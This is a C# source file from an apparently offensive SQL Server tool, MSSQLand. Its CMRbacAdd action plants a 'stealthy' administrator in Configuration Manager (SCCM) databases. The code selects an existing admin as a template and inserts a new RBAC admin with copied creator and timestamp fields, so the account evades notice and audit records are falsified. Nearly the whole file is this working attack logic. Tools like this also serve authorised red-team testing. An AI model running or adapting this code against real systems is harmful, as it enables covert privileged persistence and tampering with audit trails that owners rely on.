// MSSQLand/Actions/ConfigMgr/CMRbacAdd.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Data;

namespace MSSQLand.Actions.ConfigMgr
{
    /// <summary>
    /// Create a stealthy RBAC admin by mimicking an existing admin's attributes.
    /// Queries existing admins, selects a template (middle entry for stealth), and creates a new admin with matching patterns.
    /// </summary>
    internal class CMRbacAdd : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "Account name (domain\\user or domain\\group)")]
        private string _accountName = "";

        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Creating stealthy RBAC admin: {_accountName}");

            CMService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            var databases = sccmService.GetSccmDatabases();

            if (databases.Count == 0)
            {
                Logger.Warning("No ConfigMgr databases found");
                return null;
            }

            foreach (string db in databases)
            {
                string siteCode = CMService.GetSiteCode(db);

                Logger.NewLine();
                Logger.Info($"ConfigMgr database: {db} (Site Code: {siteCode})");

                // Query existing RBAC admins (users only, not groups)
                string query = $@"
SELECT TOP 10
    AdminID,
    AdminSID,
    LogonName,
    IsGroup,
    IsDeleted,
    CreatedBy,
    CreatedDate,
    ModifiedBy,
    ModifiedDate,
    SourceSite
FROM [{db}].dbo.RBAC_Admins
WHERE IsDeleted = 0 AND IsGroup = 0
ORDER BY CreatedDate DESC";

                DataTable existingAdmins = databaseContext.QueryService.ExecuteTable(query);

                if (existingAdmins == null || existingAdmins.Rows.Count == 0)
                {
                    Logger.Error("No existing RBAC user admins found to mimic");
                    return null;
                }

                // Select template admin (prefer middle entry for stealth)
                int templateIndex = existingAdmins.Rows.Count >= 5 ? 2 : existingAdmins.Rows.Count / 2;
                DataRow template = existingAdmins.Rows[templateIndex];

                string templateName = template["LogonName"]?.ToString();
                Logger.InfoNested($"Using template admin: {templateName} (entry {templateIndex + 1} of {existingAdmins.Rows.Count})");
                Logger.InfoNested($"Template CreatedBy: {template["CreatedBy"]}");
                Logger.InfoNested($"Template CreatedDate: {template["CreatedDate"]:yyyy-MM-dd HH:mm:ss}");
                Logger.InfoNested($"Template ModifiedBy: {template["ModifiedBy"]}");
                Logger.InfoNested($"Template ModifiedDate: {template["ModifiedDate"]:yyyy-MM-dd HH:mm:ss}");

                try
                {
                    // Insert into RBAC_Admins table - steal dates and creators from template
                    string insertQuery = $@"
INSERT INTO [{db}].dbo.RBAC_Admins (
    AdminSID,
    LogonName,
    IsGroup,
    IsDeleted,
    CreatedBy,
    CreatedDate,
    ModifiedBy,
    ModifiedDate,
    SourceSite
)
VALUES (
    SUSER_SID('{_accountName.Replace("'", "''")}'),
    '{_accountName.Replace("'", "''")}',
    0,
    0,
    '{template["CreatedBy"].ToString().Replace("'", "''")}',
    '{template["CreatedDate"]:yyyy-MM-ddTHH:mm:ss}',
    '{template["ModifiedBy"].ToString().Replace("'", "''")}',
    '{template["ModifiedDate"]:yyyy-MM-ddTHH:mm:ss}',
    '{template["SourceSite"]}'
);";

                    databaseContext.QueryService.ExecuteNonQuery(insertQuery);

                    Logger.NewLine();
                    Logger.Success("RBAC admin created successfully");
                    Logger.SuccessNested($"Account: {_accountName}");
                    Logger.SuccessNested($"CreatedBy: {template["CreatedBy"]}");
                    Logger.SuccessNested($"CreatedDate: {template["CreatedDate"]:yyyy-MM-dd HH:mm:ss}");
                    Logger.SuccessNested($"ModifiedBy: {template["ModifiedBy"]}");
                    Logger.SuccessNested($"ModifiedDate: {template["ModifiedDate"]:yyyy-MM-dd HH:mm:ss}");

                    return null;
                }
                catch (Exception ex)
                {
                    Logger.Error($"Failed to create RBAC admin: {ex.Message}");
                    return null;
                }
            }

            return null;
        }
    }
}

